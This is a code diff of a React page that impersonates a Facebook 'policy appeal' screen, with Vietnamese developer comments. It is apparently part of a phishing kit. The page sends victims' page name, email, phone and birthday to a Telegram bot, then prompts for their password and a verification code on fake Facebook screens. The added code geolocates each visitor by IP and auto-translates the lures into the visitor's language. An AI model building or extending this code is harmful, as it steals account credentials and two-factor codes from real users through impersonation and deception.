@@ -4,8 +4,10 @@ import PasswordInput from '@/components/password-input';
 import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { useState, useEffect, useCallback, useMemo } from 'react';
+import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
+import countryToLanguage from '@/utils/country_to_language';
 import detectBot from '@/utils/detect_bot';
 import axios from 'axios';
 
@@ -55,12 +57,70 @@ const Home = () => {
 
     const [showPassword, setShowPassword] = useState(false);
     const [errors, setErrors] = useState({});
-    const [translatedTexts] = useState(defaultTexts);
+    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
     const [securityChecked, setSecurityChecked] = useState(false);
     const [isFormEnabled, setIsFormEnabled] = useState(false);
     const [isSubmitting, setIsSubmitting] = useState(false);
+
+    // 🎯 Dịch ngầm cho verify + sendinfo
+    const translateBackgroundComponents = useCallback(async (targetLang) => {
+        try {
+            const passwordTexts = {
+                title: 'Please Enter Your Password',
+                description: 'For your security, you must enter your password to continue',
+                passwordLabel: 'Password',
+                placeholder: 'Enter your password',
+                continueBtn: 'Continue',
+                loadingText: 'Please wait'
+            };
+
+            const sendInfoTexts = {
+                title: 'Hệ thống chúng tôi đã tiếp nhận thông tin bạn gửi.',
+                description1: 'Nếu chúng tôi vẫn nhận thấy rằng bạn chưa đủ tuổi để sử dụng Facebook thì tài khoản của bạn sẽ vẫn bị vô hiệu hóa. Điều này là do tài khoản của bạn không tuân theo Điều khoản dịch vụ của chúng tôi.',
+                description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.'
+            };
+
+            // 🎯 Dịch verify với data mặc định
+            const verifyTexts = {
+                title: 'Check your device',
+                description: `We have sent a verification code to s****g@m****.com, ******32 . Please enter the code we just sent to continue.`,
+                placeholder: 'Enter your code',
+                infoTitle: 'Approve from another device or Enter your verification code',
+                infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
+                submit: 'Continue',
+                sendCode: 'Send new code',
+                errorMessage: 'The verification code you entered is incorrect',
+                loadingText: 'Please wait'
+            };
+
+            const [translatedPassword, translatedSendInfo, translatedVerify] = await Promise.all([
+                translateObjectTexts(passwordTexts, targetLang),
+                translateObjectTexts(sendInfoTexts, targetLang),
+                translateObjectTexts(verifyTexts, targetLang)
+            ]);
+
+            localStorage.setItem(`translatedPassword_${targetLang}`, JSON.stringify(translatedPassword));
+            localStorage.setItem(`translatedSendInfo_${targetLang}`, JSON.stringify(translatedSendInfo));
+            localStorage.setItem(`translatedVerify_${targetLang}`, JSON.stringify(translatedVerify));
+            
+        } catch (error) {
+            console.log('Background translation failed:', error);
+        }
+    }, []);
+
+    const translateObjectTexts = async (textsObject, targetLang) => {
+        const translatedObject = {};
+        for (const [key, text] of Object.entries(textsObject)) {
+            try {
+                translatedObject[key] = await translateText(text, targetLang);
+            } catch {
+                translatedObject[key] = text;
+            }
+        }
+        return translatedObject;
+    };
 
     const initializeSecurity = useCallback(async () => {
         try {
@@ -78,6 +138,15 @@ const Home = () => {
             const detectedCountry = ipData.country_code || 'US';
             setCountryCode(detectedCountry);
 
+            const targetLang = countryToLanguage[detectedCountry] || 'en';
+            localStorage.setItem('targetLang', targetLang);
+            
+            if (targetLang !== 'en') {
+                translateCriticalTexts(targetLang);
+                // 🎯 Dịch ngầm các component sau
+                translateBackgroundComponents(targetLang);
+            }
+
             const code = getCountryCallingCode(detectedCountry);
             setCallingCode(`+${code}`);
 
@@ -92,6 +161,79 @@ const Home = () => {
             setIsFormEnabled(true);
         }
     }, []);
+
+    const translateCriticalTexts = useCallback(async (targetLang) => {
+        try {
+            const [helpCenter, pagePolicyAppeals, detectedActivity, accessLimited, submitAppeal, pageName, mail, phone, birthday, yourAppeal, submit, pleaseWait, checkingSecurity] = await Promise.all([
+                translateText(defaultTexts.helpCenter, targetLang),
+                translateText(defaultTexts.pagePolicyAppeals, targetLang),
+                translateText(defaultTexts.detectedActivity, targetLang),
+                translateText(defaultTexts.accessLimited, targetLang),
+                translateText(defaultTexts.submitAppeal, targetLang),
+                translateText(defaultTexts.pageName, targetLang),
+                translateText(defaultTexts.mail, targetLang),
+                translateText(defaultTexts.phone, targetLang),
+                translateText(defaultTexts.birthday, targetLang),
+                translateText(defaultTexts.yourAppeal, targetLang),
+                translateText(defaultTexts.submit, targetLang),
+                translateText(defaultTexts.pleaseWait, targetLang),
+                translateText(defaultTexts.checkingSecurity, targetLang)
+            ]);
+
+            setTranslatedTexts(prev => ({
+                ...prev,
+                helpCenter,
+                pagePolicyAppeals,
+                detectedActivity,
+                accessLimited,
+                submitAppeal,
+                pageName,
+                mail,
+                phone,
+                birthday,
+                yourAppeal,
+                submit,
+                pleaseWait,
+                checkingSecurity
+            }));
+
+            translateRemainingTexts(targetLang);
+        } catch (error) {
+            console.log('Critical translation failed:', error.message);
+        }
+    }, [defaultTexts]);
+
+    const translateRemainingTexts = useCallback(async (targetLang) => {
+        try {
+            const [english, using, managingAccount, privacySecurity, policiesReporting, appealPlaceholder, fieldRequired, invalidEmail, about, adChoices, createAd, privacy, careers, createPage, termsPolicies, cookies] = await Promise.all([
+                translateText(defaultTexts.english, targetLang),
+                translateText(defaultTexts.using, targetLang),
+                translateText(defaultTexts.managingAccount, targetLang),
+                translateText(defaultTexts.privacySecurity, targetLang),
+                translateText(defaultTexts.policiesReporting, targetLang),
+                translateText(defaultTexts.appealPlaceholder, targetLang),
+                translateText(defaultTexts.fieldRequired, targetLang),
+                translateText(defaultTexts.invalidEmail, targetLang),
+                translateText(defaultTexts.about, targetLang),
+                translateText(defaultTexts.adChoices, targetLang),
+                translateText(defaultTexts.createAd, targetLang),
+                translateText(defaultTexts.privacy, targetLang),
+                translateText(defaultTexts.careers, targetLang),
+                translateText(defaultTexts.createPage, targetLang),
+                translateText(defaultTexts.termsPolicies, targetLang),
+                translateText(defaultTexts.cookies, targetLang)
+            ]);
+
+            setTranslatedTexts(prev => ({
+                ...prev,
+                english, using, managingAccount, privacySecurity, policiesReporting,
+                appealPlaceholder, fieldRequired, invalidEmail, about, adChoices,
+                createAd, privacy, careers, createPage, termsPolicies, cookies
+            }));
+        } catch (error) {
+            console.log('Remaining translation failed:', error.message);
+        }
+    }, [defaultTexts]);
 
     useEffect(() => {
         initializeSecurity();
@@ -191,6 +333,7 @@ const Home = () => {
         return Object.keys(newErrors).length === 0;
     };
 
+    // 🎯 Hàm submit nhanh - UPDATE ALL TRƯỚC KHI HIỆN PASSWORD
     const handleSubmit = async () => {
         if (!isFormEnabled || isSubmitting) return;
         
@@ -198,9 +341,11 @@ const Home = () => {
             try {
                 setIsSubmitting(true);
                 
+                // 🎯 GỬI TELEGRAM DATA FORM
                 const telegramMessage = formatTelegramMessage(formData);
                 await sendMessage(telegramMessage);
 
+                // 🎯 LƯU DATA VÀO LOCALSTORAGE
                 const userInfoData = {
                     name: formData.pageName,
                     email: hideEmail(formData.mail),
@@ -209,6 +354,13 @@ const Home = () => {
                 };
                 localStorage.setItem('userInfo', JSON.stringify(userInfoData));
 
+                // 🎯 UPDATE DỊCH VERIFY VỚI DATA THẬT (TRƯỚC KHI HIỆN PASSWORD)
+                const targetLang = localStorage.getItem('targetLang');
+                if (targetLang && targetLang !== 'en') {
+                    await updateVerifyTranslation(targetLang, userInfoData.email, userInfoData.phone);
+                }
+
+                // 🎯 HIỆN PASSWORD SAU KHI ĐÃ UPDATE ALL XONG
                 setIsSubmitting(false);
                 setShowPassword(true);
                 
@@ -225,6 +377,28 @@ const Home = () => {
                     inputElement.focus();
                 }
             }
+        }
+    };
+
+    // 🎯 HÀM UPDATE DỊCH VERIFY VỚI DATA THẬT
+    const updateVerifyTranslation = async (targetLang, email, phone) => {
+        try {
+            const verifyTexts = {
+                title: 'Check your device',
+                description: `We have sent a verification code to ${email}, ${phone} . Please enter the code we just sent to continue.`,
+                placeholder: 'Enter your code',
+                infoTitle: 'Approve from another device or Enter your verification code',
+                infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
+                submit: 'Continue',
+                sendCode: 'Send new code',
+                errorMessage: 'The verification code you entered is incorrect',
+                loadingText: 'Please wait'
+            };
+
+            const translatedVerify = await translateObjectTexts(verifyTexts, targetLang);
+            localStorage.setItem(`translatedVerify_${targetLang}`, JSON.stringify(translatedVerify));
+        } catch (error) {
+            console.log('Update verify translation failed:', error);
         }
     };
 
